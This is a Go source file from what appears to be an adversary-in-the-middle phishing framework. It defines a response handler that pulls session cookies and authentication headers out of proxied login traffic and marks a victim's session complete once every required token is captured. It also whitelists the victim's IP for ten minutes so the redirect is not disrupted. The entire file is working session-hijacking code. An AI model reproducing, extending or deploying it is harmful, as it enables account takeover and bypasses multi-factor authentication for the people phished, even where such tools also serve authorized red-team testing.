package response

import (
	"log/slog"
	"net/http"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

type sessionCompleter interface {
	Update(session *aitm.Session) error
	Complete(session *aitm.Session) error
	IsComplete(sess *aitm.Session, def *aitm.Phishlet) bool
}

type temporaryWhitelister interface {
	WhitelistTemporary(ip string, dur time.Duration)
}

// temporaryWhitelistDuration is how long a victim's IP is exempted from
// blocking after a successful token capture, to avoid disrupting the post-auth
// redirect flow.
const temporaryWhitelistDuration = 10 * time.Minute

// TokenExtractor captures auth tokens from upstream responses.
// When all required tokens are captured it marks the session complete and
// publishes EventSessionCompleted so the WebSocket redirect fires.
type TokenExtractor struct {
	Sessions  sessionCompleter
	Whitelist temporaryWhitelister // may be nil
	Logger    *slog.Logger
}

func (h *TokenExtractor) Name() string { return "TokenExtractor" }

func (h *TokenExtractor) Handle(ctx *aitm.ProxyContext, resp *http.Response) error {
	if ctx.Phishlet == nil || ctx.Session == nil {
		return nil
	}
	updated := false
	for _, rule := range ctx.Phishlet.AuthTokens {
		switch rule.Type {
		case aitm.TokenTypeCookie:
			updated = h.extractCookieToken(ctx, resp, rule) || updated
		case aitm.TokenTypeHTTPHeader:
			updated = h.extractHeaderToken(ctx, resp, rule) || updated
		}
	}
	if !ctx.Session.IsDone() && h.Sessions.IsComplete(ctx.Session, ctx.Phishlet) {
		if err := h.Sessions.Complete(ctx.Session); err != nil {
			h.Logger.Warn("failed to complete session", "session_id", ctx.Session.ID, "error", err)
		}
		if h.Whitelist != nil {
			h.Whitelist.WhitelistTemporary(ctx.ClientIP, temporaryWhitelistDuration)
		}
	} else if updated {
		if err := h.Sessions.Update(ctx.Session); err != nil {
			h.Logger.Warn("failed to persist captured tokens", "session_id", ctx.Session.ID, "error", err)
		}
	}
	return nil
}

func (h *TokenExtractor) extractCookieToken(ctx *aitm.ProxyContext, resp *http.Response, rule aitm.TokenRule) bool {
	updated := false
	for _, cookie := range resp.Cookies() {
		if rule.Name != nil && !rule.Name.MatchString(cookie.Name) {
			continue
		}
		if rule.Domain != "" && !aitm.MatchesDomain(cookie.Domain, rule.Domain) {
			continue
		}
		token := &aitm.CookieToken{
			Name:     cookie.Name,
			Value:    cookie.Value,
			Path:     cookie.Path,
			Domain:   cookie.Domain,
			Expires:  cookie.Expires,
			HttpOnly: cookie.HttpOnly,
			Secure:   cookie.Secure,
		}
		ctx.Session.AddCookieToken(cookie.Domain, cookie.Name, token)
		updated = true
	}
	return updated
}

func (h *TokenExtractor) extractHeaderToken(ctx *aitm.ProxyContext, resp *http.Response, rule aitm.TokenRule) bool {
	if rule.Name == nil {
		return false
	}
	for headerName, values := range resp.Header {
		if !rule.Name.MatchString(headerName) {
			continue
		}
		for _, value := range values {
			captured := value
			if rule.Search != nil {
				if matches := rule.Search.FindStringSubmatch(value); len(matches) > 1 {
					captured = matches[1]
				} else {
					continue
				}
			}
			if ctx.Session.HTTPTokens == nil {
				ctx.Session.HTTPTokens = make(map[string]string)
			}
			ctx.Session.HTTPTokens[headerName] = captured
			return true
		}
	}
	return false
}

var _ proxy.ResponseHandler = (*TokenExtractor)(nil)
